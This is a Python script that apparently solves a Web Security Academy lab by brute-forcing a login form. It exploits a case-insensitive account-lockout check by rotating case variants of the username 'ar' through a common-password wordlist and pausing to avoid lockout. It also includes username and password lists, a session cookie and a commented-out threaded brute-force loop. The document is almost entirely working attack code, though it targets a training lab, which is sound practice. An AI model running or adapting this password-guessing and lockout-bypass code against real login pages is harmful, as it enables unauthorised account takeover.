'''
I found out 2 things about this challenge
1. When check the username for account lock, seems like it's case insensitive. For example, "ar", "aR", "Ar", "AR" are all equivalent to "ar"
   in the server.
2. Even the account is locked for 1 minute after 3 failed attempts, when correct credentials, it still successfully logins.
'''

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

burp0_url = "https://0a9300ef038c47c2828d89ae00dd00b8.web-security-academy.net:443/login"
burp0_cookies = {"session": "3wNqdt2buqhbCu8Zlp10cXqAuruXDeeZ"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0a9300ef038c47c2828d89ae00dd00b8.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a9300ef038c47c2828d89ae00dd00b8.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

username_list = [
    # "carlos",
    # "root",
    # "admin",
    # "test",
    # "guest",
    # "info",
    # "adm",
    # "mysql",
    # "user",
    # "administrator",
    # "oracle",
    # "ftp",
    # "pi",
    # "puppet",
    # "ansible",
    # "ec2-user",
    # "vagrant",
    # "azureuser",
    # "academico",
    # "acceso",
    # "access",
    # "accounting",
    # "accounts",
    # "acid",
    # "activestat",
    # "ad",
    # "adam",
    # "adkit",
    # "admin",
    # "administracion",
    # "administrador",
    # "administrator",
    # "administrators",
    # "admins",
    # "ads",
    # "adserver",
    # "adsl",
    # "ae",
    # "af",
    # "affiliate",
    # "affiliates",
    # "afiliados",
    # "ag",
    # "agenda",
    # "agent",
    # "ai",
    # "aix",
    # "ajax",
    # "ak",
    # "akamai",
    # "al",
    # "alabama",
    # "alaska",
    # "albuquerque",
    # "alerts",
    # "alpha",
    # "alterwind",
    # "am",
    # "amarillo",
    # "americas",
    # "an",
    # "anaheim",
    # "analyzer",
    # "announce",
    # "announcements",
    # "antivirus",
    # "ao",
    # "ap",
    # "apache",
    # "apollo",
    # "app",
    # "app01",
    # "app1",
    # "apple",
    # "application",
    # "applications",
    # "apps",
    # "appserver",
    # "aq",
    # "ar",
    "archie",
    "arcsight",
    "argentina",
    "arizona",
    "arkansas",
    "arlington",
    "as",
    "as400",
    "asia",
    "asterix",
    "at",
    "athena",
    "atlanta",
    "atlas",
    "att",
    "au",
    "auction",
    "austin",
    "auth",
    "auto",
    "autodiscover"
]

passwd_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow",
]

print_lock = Lock()
found = False

def send_req(username, passwd):
    burp0_data = {"username": username, "password": passwd}
    try:
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        
        # with print_lock:
        #     print(f"[-] Trying {username}:{passwd}")
        
        if "Your username is" in response.text:
            # with print_lock:
            #     print(f"\n[+] Valid credentials found: {username}:{passwd}\n")
            # return (True, username, passwd)
            return "success"
        
        if "Invalid username or password" not in response.text:
            # with print_lock:
            #     print(f"\n[!] Account lock or unusual response detected!")
            #     print(f"[!] Credentials: {username}:{passwd}")
            #     print(f"[!] Response:\n{response.text}\n")
            # exit(0)
            # return (False, username, passwd)
            return "lock"
        # return (False, username, passwd)
        return "continue"
    except Exception as e:
        # with print_lock:
        #     print(f"[!] Error with {username}:{passwd} - {e}")
        return (False, username, passwd)

susp_username = ["ar", "aR", "Ar", "AR"]

cnt = 0
for passwd in passwd_list:
    signal = send_req(susp_username[cnt % 4], passwd)
    pre = cnt % 4
    cnt += 1
    if cnt % 3 == 0 and cnt > 0:
        cnt = (cnt + 1) % 4 # Skip to next username every 3 attempts
    if signal == "success":
        print(f"\n[+] Valid credentials found: {susp_username[0]}:{passwd}\n")
        break
    elif signal == "lock":
        cnt += 1
        if cnt % 3 == 0 and cnt > 0:
            cnt = (cnt + 1) % 4 # Skip to next username every 3 attempts
        continue 
                
    if (pre != cnt and pre == 0): # Finish a cycle -> wait for 1 minute or get locked
        print("[*] Waiting for 1 minute to avoid account lock...")
        time.sleep(60)

# # Use ThreadPoolExecutor for concurrent requests
# max_workers = 30  # Adjust based on your needs

# for username in username_list:
#     if found:
#         break
    
#     with ThreadPoolExecutor(max_workers=max_workers) as executor:
#         futures = {executor.submit(send_req, username, passwd): (username, passwd) for passwd in passwd_list}
        
#         for future in as_completed(futures):
#             success, user, pwd = future.result()
#             if success:
#                 found = True
#                 executor.shutdown(wait=False, cancel_futures=True)
                # break
        
